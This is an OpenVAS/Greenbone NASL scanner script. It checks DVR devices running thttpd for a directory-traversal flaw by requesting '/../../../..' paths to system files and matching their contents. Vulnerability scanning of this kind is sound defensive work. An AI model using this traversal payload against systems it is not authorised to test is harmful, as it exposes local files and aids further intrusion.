if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103714" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "Multiple DVR HTTP Server Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/60010" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-05-23 09:50:08 +0200 (Thu, 23 May 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_thttpd_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "thttpd/detected" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "The thttpd running on the remote DVR is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "insight", value: "Exploiting this issue will allow an attacker to view arbitrary local
  files within the context of the web server. Information harvested may aid in launching further attacks." );
	exit( 0 );
}
CPE = "cpe:/a:acme:thttpd";
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/";
if(http_vuln_check( port: port, url: url, pattern: "<title>DVR LOGIN" )){
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/../../../../../../../../../../../../../../../../" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

